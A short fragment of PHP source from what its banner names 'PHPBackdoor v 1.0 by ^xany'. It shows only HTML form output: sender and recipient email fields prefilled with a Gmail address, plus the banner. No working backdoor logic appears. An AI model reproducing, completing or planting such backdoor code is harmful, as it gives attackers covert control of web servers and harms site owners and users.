...
echo '<input type="text" name="exp" size="30" value="bktrklnx7@gmail.com"><br>';
echo 'Enter the receptor Email: ';
echo '<input type="text" name="recpt" size="30" value="bktrklnx7@gmail.com"><br>';
...
echo '<br><br>################################<br><br>';
echo 'PHPBackdoor v 1.0 by ^xany<br><br>';
echo '################################<br><br>';
